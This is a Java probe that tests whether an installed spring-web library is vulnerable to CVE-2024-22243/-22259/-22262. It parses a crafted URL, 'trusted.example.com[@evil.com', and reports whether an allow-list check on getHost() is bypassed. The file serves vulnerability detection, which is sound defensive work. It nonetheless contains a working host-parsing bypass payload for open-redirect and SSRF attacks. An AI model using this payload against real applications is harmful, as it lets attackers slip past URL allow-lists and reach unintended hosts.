import org.springframework.web.util.UriComponents;
import org.springframework.web.util.UriComponentsBuilder;

/**
 * Active exploit probe for CVE-2024-22243 / -22259 / -22262
 * (spring-web UriComponentsBuilder host-parsing -> open redirect / SSRF).
 *
 * This does NOT read a version string. It reproduces the real-world vulnerable
 * pattern: an app parses an attacker-supplied URL, allow-lists it by getHost(),
 * and then hands the URL to a client for a redirect / server-side request.
 *
 * A spec-conforming URL parser treats everything before '@' as userinfo, so the
 * connect host of "https://trusted.example.com[@evil.com" is evil.com. Vulnerable
 * spring-web (< 6.1.4/.5/.6) instead reports getHost()="trusted.example.com",
 * so the allow-list passes while the request really goes to evil.com -> bypass.
 * Patched spring-web reports getHost()="evil.com", so the allow-list rejects it.
 *
 * Exit codes: 0 = vulnerable (allow-list bypassed)  1 = blocked (patched)  2 = error
 */
public class UriBypassProbe {

    static final String ALLOW = "trusted.example.com";
    // reserved '[' derails the vulnerable host parser; '@' makes a real client
    // connect to evil.com regardless
    static final String PAYLOAD = "https://trusted.example.com[@evil.com/redirect";
    static final String REAL_HOST = "evil.com";

    static String springVersion() {
        try {
            String v = UriComponentsBuilder.class.getPackage().getImplementationVersion();
            return v != null ? v : "unknown";
        } catch (Exception e) {
            return "unknown";
        }
    }

    public static void main(String[] args) {
        String ver = springVersion();
        try {
            UriComponents u = UriComponentsBuilder.fromUriString(PAYLOAD).build();
            String parsedHost = u.getHost();
            boolean passesAllowList = ALLOW.equals(parsedHost);

            System.out.println("spring-web " + ver);
            System.out.println("attacker URL   : " + PAYLOAD);
            System.out.println("getHost()      : " + parsedHost);
            System.out.println("allow-list host: " + ALLOW);
            System.out.println("real connect host (per a conforming client): " + REAL_HOST);

            if (passesAllowList) {
                System.out.println("VULNERABLE: allow-list passed on host=\"" + parsedHost
                        + "\" but the request really targets " + REAL_HOST
                        + " -> open redirect / SSRF bypass");
                System.exit(0);
            } else if (REAL_HOST.equals(parsedHost)) {
                System.out.println("BLOCKED: parser reports the real host \"" + parsedHost
                        + "\", allow-list correctly rejects it (patched)");
                System.exit(1);
            } else {
                System.out.println("BLOCKED: allow-list rejected host=\"" + parsedHost + "\" (patched)");
                System.exit(1);
            }
        } catch (Exception e) {
            System.out.println("spring-web " + ver + " threw " + e.getClass().getSimpleName()
                    + ": " + e.getMessage() + " -> allow-list rejects (patched)");
            System.exit(1);
        }
    }
}
